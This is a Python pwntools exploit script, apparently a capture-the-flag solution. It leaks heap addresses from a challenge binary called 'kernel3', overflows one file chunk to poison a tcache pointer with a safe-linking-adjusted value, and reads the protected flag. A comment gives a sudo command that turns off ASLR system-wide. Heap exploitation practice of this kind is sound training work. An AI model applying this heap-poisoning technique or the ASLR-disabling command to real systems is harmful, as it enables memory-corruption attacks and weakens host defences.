#!/usr/bin/env python3

# NOTE :: sudo bash -c "echo 0 > /proc/sys/kernel/randomize_va_space"

from pwn import *

exe = ELF("kernel3")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("127.0.0.1", 9900)

    return r


def write(r, file, content):
    r.recvuntil(b'> ')
    r.sendline(b'write ' + file)
    r.recvuntil(b'editor>> ')
    r.sendline(content)

def read(r, file):
    r.recvuntil(b'> ')
    r.sendline(b'read ' + file)

def rm(r, file):
    r.recvuntil(b'> ')
    r.sendline(b'rm ' + file)

def edit(r, file, content):
    r.recvuntil(b'> ')
    r.sendline(b'edit ' + file)
    r.recvuntil(b'editor>> ')
    r.sendline(content)

def leak(r, file):
    r.recvuntil(b'> ')
    r.sendline(b'leak ' + file)
    return r.recvline().decode().rstrip()

def main():
    r = conn()

    
    write(r, b'a.txt', b'AAAA')
    write(r, b'b.txt', b'BBBB')
    write(r, b'c.txt', b'CCCC')

    FlagChunk = int(leak(r, b"a.txt"), 16) - 160
    ChunkToOverflow = int(leak(r, b"a.txt"), 16)

    rm(r, b'a.txt')
    rm(r, b'c.txt')

    log.info(f'{hex(FlagChunk)=}')
    log.info(f'{hex(ChunkToOverflow)=}')

    new_fd = FlagChunk ^ ChunkToOverflow >> 12 # to point to the flag.txt chunk

    payload = b'B' * 103 + p32(0x000000a1) + p32(new_fd)

    edit(r, b'b.txt', payload)

    write(r, b'd.txt', b'DDDD')
    write(r, b'e.txt', b'EEEE')

    write(r, b'flag.txt', b'FFFF')
    read(r, b'flag.txt')


    r.interactive()


if __name__ == "__main__":
    main()
